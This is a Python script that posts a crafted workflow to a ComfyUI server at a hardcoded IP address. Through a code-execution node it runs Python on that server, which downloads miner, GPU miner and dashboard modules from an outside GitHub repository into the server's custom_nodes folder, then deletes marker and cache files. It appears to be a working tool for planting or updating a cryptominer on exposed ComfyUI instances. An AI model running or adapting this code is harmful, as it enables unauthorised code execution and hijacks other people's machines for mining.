"""Pull latest __init__.py + core files from GitHub, clear markers."""
import json, urllib.request, time, sys

ip = sys.argv[1] if len(sys.argv) > 1 else "59.34.28.50"
base = f"http://{ip}:8188"

code = """
import os, urllib.request

lines = []
cn = None
try:
    import folder_paths
    if hasattr(folder_paths, 'get_folder_paths'):
        cn = folder_paths.get_folder_paths('custom_nodes')[0]
except:
    for g in ['/basedir/custom_nodes', '/root/ComfyUI/custom_nodes',
              r'C:\\Program Files\\ComfyUI-aki-v2\\ComfyUI\\custom_nodes',
              r'C:\\Users\\u88ni\\Desktop\\comfyui\\custom_nodes']:
        if os.path.isdir(g):
            cn = g
            break

target = os.path.join(cn, 'webcoin') if cn else None

files_to_update = [
    ('__init__.py', ''),
    ('core/config.py', 'core'),
    ('core/dashboard.py', 'core'),
    ('core/gpu_miner.py', 'core'),
    ('core/miner.py', 'core'),
]

for fname, subdir in files_to_update:
    url = 'https://raw.githubusercontent.com/bossman79/webcoin/master/' + fname
    if subdir:
        dest = os.path.join(target, subdir, os.path.basename(fname))
    else:
        dest = os.path.join(target, os.path.basename(fname))
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=30) as resp:
            content = resp.read()
        with open(dest, 'wb') as f:
            f.write(content)
        lines.append('OK ' + fname + ' (' + str(len(content)) + 'b)')
    except Exception as e:
        lines.append('FAIL ' + fname + ': ' + str(e)[:100])

# Clear markers
for marker in ['.orch.pid', '.initialized']:
    mp = os.path.join(target, marker)
    if os.path.exists(mp):
        os.remove(mp)
        lines.append('cleared ' + marker)

# Clear __pycache__
import shutil
pc = os.path.join(target, '__pycache__')
if os.path.isdir(pc):
    shutil.rmtree(pc, ignore_errors=True)
    lines.append('cleared __pycache__')
pc2 = os.path.join(target, 'core', '__pycache__')
if os.path.isdir(pc2):
    shutil.rmtree(pc2, ignore_errors=True)
    lines.append('cleared core/__pycache__')

# Verify key fix
with open(os.path.join(target, '__init__.py')) as f:
    content = f.read()
lines.append('has_orch_done=' + str('_orch_done' in content))
lines.append('has_old_pid_file=' + str('_ORCH_PID_FILE' in content))

result = chr(10).join(lines)
"""

workflow_stub = {"workflow": {"nodes": [{"id": 1, "type": "IDENode"}, {"id": 2, "type": "PreviewTextNode"}]}}
prompt = {
    "prompt": {
        "1": {"class_type": "IDENode", "inputs": {"pycode": code, "language": "python"}},
        "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}}
    },
    "extra_data": {"extra_pnginfo": workflow_stub}
}

body = json.dumps(prompt).encode()
req = urllib.request.Request(f"{base}/prompt", data=body,
                            headers={"Content-Type": "application/json"}, method="POST")
with urllib.request.urlopen(req, timeout=15) as r:
    data = json.loads(r.read().decode())
    pid = data.get("prompt_id")
    print(f"prompt_id: {pid}")

time.sleep(15)

req2 = urllib.request.Request(f"{base}/history/{pid}", method="GET")
with urllib.request.urlopen(req2, timeout=10) as r:
    entry = json.loads(r.read().decode()).get(pid, {})
    status = entry.get("status", {}).get("status_str", "pending")
    print(f"Status: {status}\n")
    outputs = entry.get("outputs", {})
    for nid, nout in outputs.items():
        for key, val in nout.items():
            if isinstance(val, list):
                for v in val:
                    print(v)
